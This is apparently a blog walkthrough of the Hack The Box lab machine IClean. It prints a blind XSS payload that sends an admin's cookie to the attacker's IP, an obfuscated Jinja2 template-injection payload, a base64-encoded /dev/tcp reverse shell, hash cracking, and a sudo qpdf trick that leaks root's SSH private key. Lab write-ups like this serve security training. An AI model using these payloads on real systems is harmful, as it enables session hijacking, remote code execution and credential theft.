---
title:  "HTB IClean Writeup"
date:   2024-08-03 00:30:00 
categories: HTB Machine
tags: SSTI XSS sudo_abuse qpdf
---

![IClean](/assets/img/Iclean/image.png)

## Introduction

Iclean was an interesting machine the initial access was quite easy once you identify the injection points. These injection points weren't the most trivial though which caused me to spend quite some time to figure out where to inject the cross site scripting payloads.

Privilege escalation was quite fun as it was exploiting a binary that I've never seen before. By just looking at the help page it would become quite clear what needed the intended attack path was


If you like any of my content it would help a lot if you used my referral link to buy Hack The Box/Academy Subscriptions which you can find on my about page.

## Initial access
### Recon

To start off our recon we will begin with an Nmap scan of the machine. Using the following command:
```
sudo nmap -sS -A -p-  -o nmap  10.10.11.12
```
**Nmap**
```
# Nmap 7.94 scan initiated Mon Apr 29 12:40:02 2024 as: nmap -sS -A -p- -o nmap 10.10.11.12
Nmap scan report for 10.10.11.12
Host is up (0.053s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 2c:f9:07:77:e3:f1:3a:36:db:f2:3b:94:e3:b7:cf:b2 (ECDSA)
|_  256 4a:91:9f:f2:74:c0:41:81:52:4d:f1:ff:2d:01:78:6b (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=4/29%OT=22%CT=1%CU=34247%PV=Y%DS=2%DC=T%G=Y%TM=662FCD8
OS:3%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10F%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M53AST11NW7%O2=M53AST11NW7%O3=M53ANNT11NW7%O4=M53AST11NW7%O5=M53AST1
OS:1NW7%O6=M53AST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M53ANNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 199/tcp)
HOP RTT      ADDRESS
1   44.35 ms 10.10.16.1
2   22.50 ms 10.10.11.12

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Apr 29 12:40:35 2024 -- 1 IP address (1 host up) scanned in 32.94 seconds

```
Looking at the Nmap output we can see that there are two ports open one being SSH and the other being a webpage on port 80. When browsing to this webpage we would be instantly redirected to **capiclean.htb**. After adding this domain to our hostfile we'd see the following website of a cleaning company.

![Homepage](/assets/img/Iclean/Iclean_01.png)

Looking furhter on this webpage i couldn't find much dynamic content other than the quote page. After doing some testing i found out it was possible to perform a blind cross site scripting attack on this page. By sending the following request.

```
POST /sendMessage HTTP/1.1
Host: capiclean.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 151
Origin: http://capiclean.htb
Connection: close
Referer: http://capiclean.htb/quote
Upgrade-Insecure-Requests: 1

service=Carpet+Cleaning&service=Tile+%26+Grout&service=<img%20src=x%20onerror=fetch("http://10.10.16.69/TEST?"%2bdocument.cookie);>&email=test%40me.com
```

After sending this request the the browser of an administrative user would send a request to our webserver containing the sessions token of this user. To catch this request we setup a webserver first using python

```bash
python -m http.server 80
```

![Cookie stolen](/assets/img/Iclean/Iclean_02.png)

Now we can add this cookie to our browser by adding this cookie to our browser in the storage tab.

![Cookie injected](/assets/img/Iclean/Iclean_03.png)

Now adding the cookie and refreshing didn't change the UI so we still needed to find what the admin panels url exactly was. Before i started to run a brute forcing script i decided to try out a few common paths such as dashboard. Dashboard was actually a path restricted to the administrators which we now had access too.

![Admin page found](/assets/img/Iclean/Iclean_04.png)


### Code execution

So looking through the different functionalities it seems that the generate qr code functionality looked the most interesting of them all. Before we could use this we needed to first generate a valid invoice ID. We could do this by filling in the form like so. 

![Invoice creation ](/assets/img/Iclean/Iclean_05.png)

The browser would send the following request:

```
POST /InvoiceGenerator HTTP/1.1
Host: capiclean.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 113
Origin: http://capiclean.htb
Connection: close
Referer: http://capiclean.htb/InvoiceGenerator
Cookie: session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.Zi_FFg.4KcBWzEmiHeXXKR322SDXUddFsA
Upgrade-Insecure-Requests: 1

selected_service=Basic+Cleaning&qty=1&project=Calico&client=Calico&address=Calico&email-address=test%40nomail.com
```

To which the server responded with the following page giving us a valid invoice id of **6876819294**

![Invoice Generated](/assets/img/Iclean/Iclean_06.png)

Now that we have a valid invoice ID we can use the generate QR code function with our valid invoice id. This will send the following request after pressing generate

![Invoice Generated](/assets/img/Iclean/Iclean_07.png)

```
POST /QRGenerator HTTP/1.1
Host: capiclean.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 42
Origin: http://capiclean.htb
Connection: close
Referer: http://capiclean.htb/QRGenerator
Cookie: session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.Zi_FFg.4KcBWzEmiHeXXKR322SDXUddFsA
Upgrade-Insecure-Requests: 1

form_type=invoice_id&invoice_id=6876819294
```
This will then show the following window where we can insert a QR link to generate a scannable invoice. This request however upon closer inspection was vulnerable to Server Side Template Injection.I was able to discover this by adding  the {% raw %} {{ 7 * 7}} {% endraw %} to value. We send the following request.

```
POST /QRGenerator HTTP/1.1
Host: capiclean.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 63
Origin: http://capiclean.htb
Connection: close
Referer: http://capiclean.htb/QRGenerator
Cookie: session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.Zi_FFg.4KcBWzEmiHeXXKR322SDXUddFsA
Upgrade-Insecure-Requests: 1

invoice_id=&form_type=scannable_invoice&qr_link=%7B%7B7*7%7D%7D
```

The server would then issue the following valid response. Most of the response has been removed for brevity, however we can see that the value behind our image is now 49 which means that the template has executed our calculation of 7*7. This is a clear sign of template injection. 

```
HTTP/1.1 200 OK
Date: Mon, 29 Apr 2024 20:04:14 GMT
Server: Werkzeug/2.3.7 Python/3.10.12
Content-Type: text/html; charset=utf-8
Vary: Cookie,Accept-Encoding
Content-Length: 4422
Connection: close

<!DOCTYPE html>
<html lang="en">
<head>
<Snipped>

<div class="qr-code-container"><div class="qr-code"><img src="data:image/png;base64,49" alt="QR Code"></div>
</body>
</html>
```

So our next step is to expand this to do some kind of code execution. We'll start by trying to output the whoami command with this server side template injection. with the following payload we'd be able execute arbitary system commands


```
{% raw %}{{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("bash -c 'whoami'")|attr("read")()}}{% endraw %}
```

Our browser would send the following request when using this payload.

```
POST /QRGenerator HTTP/1.1
Host: capiclean.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 432
Origin: http://capiclean.htb
Connection: close
Referer: http://capiclean.htb/QRGenerator
Cookie: session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.Zi_FFg.4KcBWzEmiHeXXKR322SDXUddFsA
Upgrade-Insecure-Requests: 1

invoice_id=&form_type=scannable_invoice&qr_link=%7B%7Brequest%7Cattr%28%22application%22%29%7Cattr%28%22%5Cx5f%5Cx5fglobals%5Cx5f%5Cx5f%22%29%7Cattr%28%22%5Cx5f%5Cx5fgetitem%5Cx5f%5Cx5f%22%29%28%22%5Cx5f%5Cx5fbuiltins%5Cx5f%5Cx5f%22%29%7Cattr%28%22%5Cx5f%5Cx5fgetitem%5Cx5f%5Cx5f%22%29%28%22%5Cx5f%5Cx5fimport%5Cx5f%5Cx5f%22%29%28%22os%22%29%7Cattr%28%22popen%22%29%28%22bash+-c+%27whoami%27%22%29%7Cattr%28%22read%22%29%28%29%7D%7D
```
The server would then issue the following valid response showing that this server was running as www-data.

```
HTTP/1.1 200 OK
Date: Mon, 29 Apr 2024 20:13:28 GMT
Server: Werkzeug/2.3.7 Python/3.10.12
Content-Type: text/html; charset=utf-8
Vary: Cookie,Accept-Encoding
Connection: close
Content-Length: 4429

<!DOCTYPE html>
<html lang="en">
<head>

<Snipped>

<div class="qr-code-container"><div class="qr-code"><img src="data:image/png;base64,www-data
" alt="QR Code"></div>
</body>
</html>
```

So now our next step is to fully weaponize this with a reverse shell. So to have less issues with syntax i'll base64 encode my reverse shell.

```
echo -n '/bin/bash -l > /dev/tcp/10.10.16.69/443 0<&1 2>&1' | base64
```

this command gave us the following B64 encoded string 
```
L2Jpbi9iYXNoIC1sID4gL2Rldi90Y3AvMTAuMTAuMTYuNjkvNDQzIDA8JjEgMj4mMQ==
```

Then using this B64 string our payload will look like this:

```
echo L2Jpbi9iYXNoIC1sID4gL2Rldi90Y3AvMTAuMTAuMTYuNjkvNDQzIDA8JjEgMj4mMQ== | base64 --decode | bash
```

now we need to embed this payload into our server side template injection payload

```
{% raw %}{{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("bash -c 'echo L2Jpbi9iYXNoIC1sID4gL2Rldi90Y3AvMTAuMTAuMTYuNjkvNDQzIDA8JjEgMj4mMQ== | base64 --decode | bash
'")|attr("read")()}}{% endraw %}
```

Before executing this don't forget to turn on your listener

```
nc -lvp 443
```

Then after executing this payload the same way we did before we'd get a callback on our reverse shell handler.

![Reverse shell as www-data](/assets/img/Iclean/Iclean_08.png)

## Lateral movement

So now we have a reverse shell as the www-data user we need to escalate this to another user account. When looking through the application files i was able to find the credentials of the mysql database used for authentication of the application. Most of the code has been removed from the following snippet for brevity.

```python
from flask import Flask, render_template, request, jsonify, make_response, session, redirect, url_for
from flask import render_template_string
import pymysql
import hashlib
import os
import random, string
import pyqrcode
from jinja2 import StrictUndefined
from io import BytesIO
import re, requests, base64

app = Flask(__name__)

app.config['SESSION_COOKIE_HTTPONLY'] = False

secret_key = ''.join(random.choice(string.ascii_lowercase) for i in range(64))
app.secret_key = secret_key
# Database Configuration
db_config = {
    'host': '127.0.0.1',
    'user': 'iclean',
    'password': 'pxCsmnGLckUb',
    'database': 'capiclean'
}
```

Using these credentials we would be able to extract information from the database such as the password hashes of the users within the application. 
Before we can connect to mysql we need to upgrade our reverse shell to a fully interactive shell. We can do this with the following python oneliner 

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Next we can connect to  mysql database with the following command. When it asks for the password fill in **pxCsmnGLckUb**.

```bash
mysql -h 127.0.0.1 -u iclean -p capiclean
```

First of we want to know what tables are present within this database we enumerate these with the following command:

```bash
show tables;
```
![Tables](/assets/img/Iclean/Iclean_09.png)

next we can dump the full users database with the following command:

```bash
select * from capiclean.users;
```

![cracked](/assets/img/Iclean/Iclean_10.png)

this gives us the following hash file that we can then crack with hashcat

```
2ae316f10d49222f369139ce899e414e57ed9e339bb75457446f2ba8628a6e51
0a298fdd4d546844ae940357b631e40bf2a7847932f82c494daa1c9c5d6927aa
```

We can crack these hashes with the following hashcat command. We'll be trying to crack these sha256 hashes

```bash
hashcat -a 0 -m 1400 hash /usr/share/wordlists/rockyou.txt -w 3 -O -o cracked.txt
```

After a few seconds we'd get the crack the hash of consuela giving us access to her cleartext credentials

```
0a298fdd4d546844ae940357b631e40bf2a7847932f82c494daa1c9c5d6927aa:simple and clean
```

We can now use these credentials to log into the server using ssh. When it asks for a password fill in **simple and clean**

```
ssh consuela@capiclean.htb
```

![user access](/assets/img/Iclean/Iclean_11.png)


## Privilege escalation

So now that we have user access the first thing i always check is if this user is able to run any commands as root. In the user was allowed to run **/usr/bin/qpdf** as root.

```bash 
sudo -l
```

![Sudo -l](/assets/img/Iclean/Iclean_12.png)

when looking at the help command of this file there is the **add-attachment** parameter which looks very interesting. Seeing that this runs as root we might be able to extract for example the ssh key of the root user.

![Sudo -l](/assets/img/Iclean/Iclean_13.png)


After some further investigation of this command we'd end up with the following command. This command will then add the ssh key of the root user into a pdf file as attachment.

```bash
sudo /usr/bin/qpdf --empty /tmp/key.pdf --qdf  --add-attachment /root/.ssh/id_rsa --
```

Then we read the content of the pdf file with cat and we can clearly see an ssh key present near the bottom of the file

```bash 
cat key.pdf
```
output
```
%PDF-1.3
%����
%QDF-1.0

%% Original object ID: 1 0
1 0 obj
<<
  /Names <<
    /EmbeddedFiles 2 0 R
  >>
  /PageMode /UseAttachments
  /Pages 3 0 R
  /Type /Catalog
>>
endobj

%% Original object ID: 5 0
2 0 obj
<<
  /Names [
    (id_rsa)
    4 0 R
  ]
>>
endobj

%% Original object ID: 2 0
3 0 obj
<<
  /Count 0
  /Kids [
  ]
  /Type /Pages
>>
endobj

%% Original object ID: 4 0
4 0 obj
<<
  /EF <<
    /F 5 0 R
    /UF 5 0 R
  >>
  /F (id_rsa)
  /Type /Filespec
  /UF (id_rsa)
>>
endobj

%% Original object ID: 3 0
5 0 obj
<<
  /Params <<
    /CheckSum <bb34da3f74ca5fb11f4ccbc393e113bc>
    /CreationDate (D:20240429210658Z)
    /ModDate (D:20240429210658Z)
    /Size 505
  >>
  /Type /EmbeddedFile
  /Length 6 0 R
>>
stream
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAaAAAABNlY2RzYS
1zaGEyLW5pc3RwMjU2AAAACG5pc3RwMjU2AAAAQQQMb6Wn/o1SBLJUpiVfUaxWHAE64hBN
vX1ZjgJ9wc9nfjEqFS+jAtTyEljTqB+DjJLtRfP4N40SdoZ9yvekRQDRAAAAqGOKt0ljir
dJAAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAxvpaf+jVIEslSm
JV9RrFYcATriEE29fVmOAn3Bz2d+MSoVL6MC1PISWNOoH4OMku1F8/g3jRJ2hn3K96RFAN
EAAAAgK2QvEb+leR18iSesuyvCZCW1mI+YDL7sqwb+XMiIE/4AAAALcm9vdEBpY2xlYW4B
AgMEBQ==
-----END OPENSSH PRIVATE KEY-----
endstream
endobj

6 0 obj
505
endobj

xref
0 7
0000000000 65535 f 
0000000052 00000 n 
0000000203 00000 n 
0000000290 00000 n 
0000000379 00000 n 
0000000516 00000 n 
0000001250 00000 n 
trailer <<
  /Root 1 0 R
  /Size 7
  /ID [<32176aa2630d5499c0453a377a51ca8b><32176aa2630d5499c0453a377a51ca8b>]
>>
startxref
1270
%%EOF
```

we copy the ssh key out of it into a file like so

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAaAAAABNlY2RzYS
1zaGEyLW5pc3RwMjU2AAAACG5pc3RwMjU2AAAAQQQMb6Wn/o1SBLJUpiVfUaxWHAE64hBN
vX1ZjgJ9wc9nfjEqFS+jAtTyEljTqB+DjJLtRfP4N40SdoZ9yvekRQDRAAAAqGOKt0ljir
dJAAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAxvpaf+jVIEslSm
JV9RrFYcATriEE29fVmOAn3Bz2d+MSoVL6MC1PISWNOoH4OMku1F8/g3jRJ2hn3K96RFAN
EAAAAgK2QvEb+leR18iSesuyvCZCW1mI+YDL7sqwb+XMiIE/4AAAALcm9vdEBpY2xlYW4B
AgMEBQ==
-----END OPENSSH PRIVATE KEY-----

```

Next we set the permissions right on the ssh key. If we don't do this then our SSH client won't try to connect to server to begin with.

```bash
chmod +600 root_id_rsa
```

Then lastly we can connect to the server with the following ssh command:

```bash
ssh -i root_id_rsa  root@capiclean.htb
```
![Root access](/assets/img/Iclean/Iclean_14.png)


